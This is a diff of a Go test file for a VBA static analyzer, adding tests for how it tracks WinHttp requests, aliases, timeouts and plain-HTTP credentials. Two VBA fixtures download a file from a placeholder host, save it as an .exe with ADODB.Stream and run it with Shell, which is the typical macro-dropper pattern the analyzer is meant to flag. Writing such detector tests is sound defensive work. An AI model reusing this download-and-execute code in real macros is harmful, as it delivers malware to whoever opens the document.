@@ -2,7 +2,10 @@ package analyze
 
 import (
 	"encoding/json"
+	"fmt"
 	"path/filepath"
+	"reflect"
+	"sort"
 	"strconv"
 	"strings"
 	"testing"
@@ -860,4 +863,269 @@ End Sub
 	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
 		t.Fatalf("reassigned alias timeout findings = %+v", got)
 	}
+}
+
+func TestHTTPCompactSelfAssignmentPreservesObjectState(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run()
+    Dim request As Object
+    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Set request = request
+    request.SetTimeouts 1000, 1000, 1000, 1000
+    request.Open "GET", "https://example.test", False
+    request.Send
+End Sub
+`)
+	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := findingsByCode(findings, "VBA247"); len(got) != 0 {
+		t.Fatalf("self-assignment discarded timeout state: %+v", got)
+	}
+}
+
+func TestHTTPCompactPreservesBranchUnknownsAndAliasJoins(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run(ByVal configure As Boolean, ByVal useHTTP As Boolean)
+    Dim request As Object
+    Dim aliasRequest As Object
+    Dim target As String
+    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Set aliasRequest = request
+    If configure Then
+        aliasRequest.SetTimeouts 1000, 1000, 1000, 1000
+    End If
+    If useHTTP Then
+        target = "http://api.example.test"
+    Else
+        target = "https://api.example.test"
+    End If
+    request.Open "GET", target, False
+    request.SetCredentials "user", "password", 0
+    request.Send
+End Sub
+`)
+	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
+		for _, finding := range got {
+			if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "plain_http_credentials" {
+				t.Fatalf("conflicting URL branches became a plain HTTP finding: %+v", finding)
+			}
+		}
+	}
+	got := findingsByCode(findings, "VBA247")
+	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
+		t.Fatalf("branch timeout join findings = %+v", got)
+	}
+}
+
+func TestHTTPCompactLoopAliasStateDoesNotDuplicateFindings(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run()
+    Dim request As Object
+    Dim aliasRequest As Object
+    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Set aliasRequest = request
+    For i = 1 To 2
+        aliasRequest.SetTimeouts 1000, 1000, 1000, 1000
+    Next i
+    request.Open "GET", "https://example.test", False
+    request.Send
+End Sub
+`)
+	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := findingsByCode(findings, "VBA247"); len(got) != 0 {
+		t.Fatalf("finite timeout through loop alias produced findings: %+v", got)
+	}
+}
+
+func TestHTTPCompactSaveEvidencePropagatesToStreamAliases(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run()
+    Dim request As Object
+    Dim stream As ADODB.Stream
+    Dim aliasStream As ADODB.Stream
+    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    request.Open "GET", "https://example.test/payload", False
+    request.Send
+    Set stream = New ADODB.Stream
+    Set aliasStream = stream
+    aliasStream.Write request.ResponseBody
+    aliasStream.SaveToFile "C:\Temp\payload.exe", 2
+    Shell "C:\Temp\payload.exe"
+End Sub
+`)
+	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, finding := range findingsByCode(findings, "VBA246") {
+		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
+			return
+		}
+	}
+	t.Fatalf("alias SaveToFile did not produce download_and_execute: %+v", findings)
+}
+
+func TestHTTPCompactSkipsUnreachableStatements(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run()
+    Dim request As Object
+    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Exit Sub
+    Debug.Print "Bearer unreachable-token"
+    request.Open "GET", "http://user:password@example.test", False
+    request.Send
+End Sub
+`)
+	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
+		t.Fatalf("unreachable HTTP statement produced findings: %+v", got)
+	}
+}
+
+func TestHTTPCompactIntersectsSavedPathsAcrossDifferentSites(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run(ByVal chooseFirst As Boolean)
+	Dim request As Object
+	Dim stream As ADODB.Stream
+	Dim savePath As String
+	Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+	request.Open "GET", "https://example.test/payload", False
+	request.Send
+	Set stream = New ADODB.Stream
+	stream.Write request.ResponseBody
+	savePath = "C:\Temp\same.exe"
+	If chooseFirst Then
+		stream . SaveToFile savePath, 2
+	Else
+		stream . SaveToFile savePath, 2
+	End If
+	Shell savePath
+End Sub
+`)
+	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, finding := range findingsByCode(findings, "VBA246") {
+		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
+			return
+		}
+	}
+	t.Fatalf("same path at different SaveToFile sites was lost: %+v", findings)
+}
+
+func TestHTTPCompactUncertainIdentityPreservesVBA224Ownership(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run(ByVal chooseClient As Boolean)
+    Dim request As Object
+    If chooseClient Then
+        Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Else
+        Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    End If
+    request.SetTimeouts 1000, 1000, 1000, 1000
+    request.Open "GET", "http://example.test", False
+    request.SetRequestHeader "Authorization", InputBox("Token")
+    request.Send
+End Sub
+`)
+	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := findingsByCode(findings, "VBA246"); len(got) == 0 {
+		t.Fatalf("missing specialized uncertain-identity finding: %+v", findings)
+	}
+	if got := findingsByCode(findings, "VBA224"); len(got) != 0 {
+		t.Fatalf("VBA224 was not suppressed by uncertain-identity sink ownership: %+v", got)
+	}
+}
+
+func TestHTTPCompactBatchAndRealtimeOrderingMatch(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	source := `Attribute VB_Name = "Main"
+Option Explicit
+Public Sub Run()
+    Dim request As Object
+    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
+    request.Open "GET", "http://example.test", False, "user", "password"
+    request.Send
+End Sub
+`
+	writeModule(t, dir, "Main.bas", source)
+	cfg := config.Default()
+	batch, err := (Analyzer{RootDir: dir, Config: cfg}).Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	realtime, err := runRealtimeForSingleModule(t, dir, cfg, "Main.bas")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got, want := httpFindingDigest(batch), httpFindingDigest(realtime); !reflect.DeepEqual(got, want) {
+		t.Fatalf("batch/realtime HTTP digest differs:\n batch=%#v\n realtime=%#v", got, want)
+	}
+}
+
+func httpFindingDigest(findings []Finding) []string {
+	digest := make([]string, 0, len(findings))
+	for _, finding := range findings {
+		api, risk, header, origin, timeout := "", "", "", "", ""
+		if finding.HTTPSecurity != nil {
+			api, risk, header, origin = finding.HTTPSecurity.API, finding.HTTPSecurity.RiskKind, finding.HTTPSecurity.Header, finding.HTTPSecurity.Origin
+		}
+		if finding.HTTPReliability != nil {
+			api, risk, timeout = finding.HTTPReliability.API, finding.HTTPReliability.RiskKind, finding.HTTPReliability.TimeoutState
+		}
+		owned := make([]int, 0, len(finding.httpOwnedSinks))
+		for sink, present := range finding.httpOwnedSinks {
+			if present {
+				owned = append(owned, sink)
+			}
+		}
+		sort.Ints(owned)
+		ownedDigest := make([]string, 0, len(owned))
+		for _, sink := range owned {
+			ownedDigest = append(ownedDigest, strconv.Itoa(sink))
+		}
+		// Keep the differential oracle sensitive to the public diagnostic
+		// contract: order/multiplicity, range, severity, redacted witness
+		// projection, and HTTP context fields all participate in the digest.
+		digest = append(digest, fmt.Sprintf("%s|%s|%s|%s|%d|%d|%d|%d|%s|%s|%s|%s|%s|%s|%s", finding.Code, finding.Severity, finding.File, finding.Procedure, finding.Line, finding.Column, finding.EndLine, finding.EndColumn, api, risk, header, origin, timeout, strings.Join(finding.NearbyCode, "\x1f"), strings.Join(ownedDigest, ",")))
+	}
+	return digest
 }
